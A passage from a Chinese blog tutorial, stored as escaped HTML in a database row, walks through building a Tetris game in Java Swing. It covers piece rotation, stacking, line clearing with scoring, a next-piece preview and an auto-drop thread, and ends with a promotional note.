punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> blocks<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n			block <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Block</span><span class=\"token punctuation\">)</span>blocks<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			block<span class=\"token punctuation\">.</span><span class=\"token function\">draw</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>我这里设定创建Model的时候x为7，y为3，于是：<br> <img src=\"https://img-blog.csdnimg.cn/20210608001052595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <mark>图形创建好了，怎么去移动这个图形呢</mark><br> 很简单就是键盘移动的时候，改成调用Model类的move方法了，此方法里面就是循环模型的4个Block实例，每个小块调用自己的move方法即可：<br> <img src=\"https://img-blog.csdnimg.cn/20210608001527249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> 效果如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210608001542214.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_482\"></a>模型旋转变形</h2> \n <p><mark>旋转万能公式 <font color=\"red\">x=-y y=x</font> 这里的x、y指的是Data类里面二维数组的值，也就是 Block中的偏移值</mark></p> \n <p>在Block中添加变形方法</p> \n <pre><code class=\"prism language-java\">	<span class=\"token comment\">//变形</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token comment\">//旋转万能公式 x=-y y=x</span>\n		<span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> mX<span class=\"token punctuation\">;</span>\n		mX <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>mY<span class=\"token punctuation\">;</span>\n		mY <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><mark>Model中添加变形方法，就是循环4个Block实例</mark><br> 这里加入了<mark>预变形</mark>方法，就是要先判断能否变形，比如变形会出边界，会碰到别的方块，则不让变形。</p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//旋转</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">boolean</span> flag <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//允许变形</span>\n	<span class=\"token class-name\">Block</span> block<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> blocks<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		block <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Block</span><span class=\"token punctuation\">)</span>blocks<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>block<span class=\"token punctuation\">.</span><span class=\"token function\">preRotate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span> <span class=\"token comment\">//有一个不让变形就不能变形</span>\n			flag <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//不能变形</span>\n			<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> blocks<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n			block <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Block</span><span class=\"token punctuation\">)</span>blocks<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			block<span class=\"token punctuation\">.</span><span class=\"token function\">rotate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n	panel<span class=\"token punctuation\">.</span><span class=\"token function\">repaint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210608002328742.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_521\"></a>方块累计</h2> \n <p><mark>当图形触底或者接触往下接触到其他方块时，会累计在下面，并且创建新的图形出来。</mark><br> public Block[][] blockStack = new Block[15][20];<br> 这个二维数组用来存储累计的方块<br> 图形触底后，会根据每个小block实例的位置一一对应插入到blockStack这个二维数组中。<br> <img src=\"https://img-blog.csdnimg.cn/20210608002920826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <mark>在paint方法中加入累积块的绘制</mark></p> \n <pre><code class=\"prism language-java\">	<span class=\"token comment\">//累计块</span>\n		<span class=\"token class-name\">Block</span> bott <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n				bott <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Block</span><span class=\"token punctuation\">)</span>blockStack<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n				<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>bott<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n					bott<span class=\"token punctuation\">.</span><span class=\"token function\">draw</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n				<span class=\"token punctuation\">}</span>\n			<span class=\"token punctuation\">}</span>\n		<span class=\"token punctuation\">}</span>\n</code></pre> \n <h2><a id=\"_542\"></a>方块消除和积分</h2> \n <p><strong>1.从当前撞击的模型中取出y坐标（注意去重）。<br> 2.将y进行排序，让位置小的排在前面，也就是如果消除两行的话要先消上面的那行。<br> 2.消除当前行采用的是数据替换，<mark>从当前行开始，上一行的数据往下一行赋值，当前行就等于被消除了</mark>。<br> 3.积分处理。</strong></p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//消除处理</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">Block</span> block <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> num<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> y<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token class-name\">List</span> hasDoList<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n	<span class=\"token class-name\">List</span> clearList<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> blocks<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		block <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Block</span><span class=\"token punctuation\">)</span>blocks<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		y <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span><span class=\"token function\">getY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> block<span class=\"token punctuation\">.</span><span class=\"token function\">getmY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>y<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span> <span class=\"token operator\">||</span> y<span class=\"token operator\">&gt;</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n		\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>hasDoList<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n			hasDoList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n				clearList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n				num<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>num<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		panel<span class=\"token punctuation\">.</span>curCount<span class=\"token operator\">+=</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>num<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		panel<span class=\"token punctuation\">.</span>curCount<span class=\"token operator\">+=</span><span class=\"token number\">300</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>num<span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		panel<span class=\"token punctuation\">.</span>curCount<span class=\"token operator\">+=</span><span class=\"token number\">600</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>num<span class=\"token operator\">==</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		panel<span class=\"token punctuation\">.</span>curCount<span class=\"token operator\">+=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token comment\">//执行格子的消除动作</span>\n	<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>num<span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token class-name\">Collections</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>clearList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token function\">doClear</span><span class=\"token punctuation\">(</span>clearList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//执行消除</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">doClear</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">List</span> l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">int</span> y<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> l<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		y <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token function\">clearClock</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">clearClock</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token class-name\">Block</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> stack <span class=\"token operator\">=</span> panel<span class=\"token punctuation\">.</span>blockStack<span class=\"token punctuation\">;</span>\n	<span class=\"token class-name\">Block</span> block<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">19</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//从最下面往上</span>\n			<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>y<span class=\"token operator\">&gt;=</span>j<span class=\"token operator\">&amp;&amp;</span>j<span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//消除行和上方的行，全部往下移动，即这行等于上一行的数据</span>\n				block <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n				<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>block<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n					block<span class=\"token punctuation\">.</span><span class=\"token function\">setY</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span><span class=\"token function\">getY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n				<span class=\"token punctuation\">}</span>\n				stack<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>block<span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//第一行，清空</span>\n				stack<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>积分规则：1行100分、2行300分、3行600分、4行1000分<br> <img src=\"https://img-blog.csdnimg.cn/20210608003852720.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_613\"></a>显示下一个</h2> \n <p>这个其实不难：<br> 1.创建好当前模型的时候，同时创建好下一个模型，并绘制出来；<br> 2.当前模型触底累计后，把下一个模型设置为当前模型。<br> 3.同时创建一个新模型做为下一个模型。</p> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//创建模型</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">createModel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> type<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//游戏刚开始时</span>\n			curModel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			nextModel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token comment\">//游戏运行中</span>\n			curModel <span class=\"token operator\">=</span> nextModel<span class=\"token punctuation\">;</span>\n			nextModel <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Model</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>在paint方法中绘制‘下一个’，在右边的下一个区域显示</strong></p> \n <pre><code class=\"prism language-java\">		<span class=\"token comment\">//下一个模型</span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>nextModel<span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token class-name\">List</span> blocks <span class=\"token operator\">=</span> nextModel<span class=\"token punctuation\">.</span><span class=\"token function\">getBlocks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token class-name\">Block</span> block<span class=\"token operator\">=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n			<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> blocks<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n				block <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Block</span><span class=\"token punctuation\">)</span>blocks<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n				block<span class=\"token punctuation\">.</span><span class=\"token function\">drawNext</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span>\n		<span class=\"token punctuation\">}</span>\n</code></pre> \n <h2><a id=\"_643\"></a>加入自动向下线程，并启动</h2> \n <pre><code class=\"prism language-java\"><span class=\"token comment\">//游戏线程，用来自动下移</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">GameThread</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Runnable</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token annotation punctuation\">@Override</span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"start\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>gameFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n				curModel<span class=\"token punctuation\">.</span><span class=\"token function\">move</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span>\n			<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n				<span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n				e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n			<span class=\"token punctuation\">}</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210608004721337.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_664\"></a>最后</h2> \n <p><strong>加入积分、按键控制、游戏结束、重新开始等就完成了</strong></p> \n <p><strong>看到这里的大佬，动动发财的小手 <font color=\"red\">点赞</font> + <font color=\"red\">回复</font> + <font color=\"red\">收藏</font>，能<font color=\"red\">【 关注 </font>】一波就更好了。</strong></p> \n <p><strong>想要代码的 <mark>加微信</mark> 或 <mark>私聊</mark> 我！</strong></p> \n <p>为了帮助更多小白从零进阶 Java 工程师，从CSDN官方那边搞来了一套 <font color=\"red\">《Java 工程师学习成长知识图谱》</font>，尺寸 <font color=\"red\">870mm x 560mm</font>，展开后有一张办公桌大小，也可以折叠成一本书的尺寸，原件<mark>129元</mark>现价<font color=\"red\"> 29 元</font>，<mark>先到先得，有兴趣的小伙伴可以了解一下</mark>！</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210608005133287.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrbTEyMzQ1Ng==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
